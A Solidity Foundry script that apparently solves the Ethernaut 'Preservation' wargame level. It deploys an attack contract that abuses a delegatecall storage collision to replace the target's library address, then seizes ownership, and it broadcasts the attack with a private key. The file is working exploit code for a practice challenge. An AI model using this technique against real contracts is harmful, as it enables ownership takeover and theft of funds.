// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level16.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract AttackCont {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    Preservation public preservation =
        Preservation(0x64A0e971cafE8773037A6E26a33741A647Fd5d43);

    function gogo() external {
        preservation.setFirstTime(uint256(uint160(address(this))));
        preservation.setFirstTime(
            uint256(uint160(0xBD008DB3d8704Ce124fcd13E448E950B409e07E1))
        );
    }

    function setTime(uint256 _time) public {
        owner = address(uint160(_time));
    }
}

contract PreservationSolution is Script {
    Preservation public preservation =
        Preservation(0x64A0e971cafE8773037A6E26a33741A647Fd5d43);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        AttackCont attack = new AttackCont();
        attack.gogo();
        console.log(address(attack));
        console.log(preservation.timeZone1Library());
        console.log(preservation.owner());

        vm.stopBroadcast();
    }
}
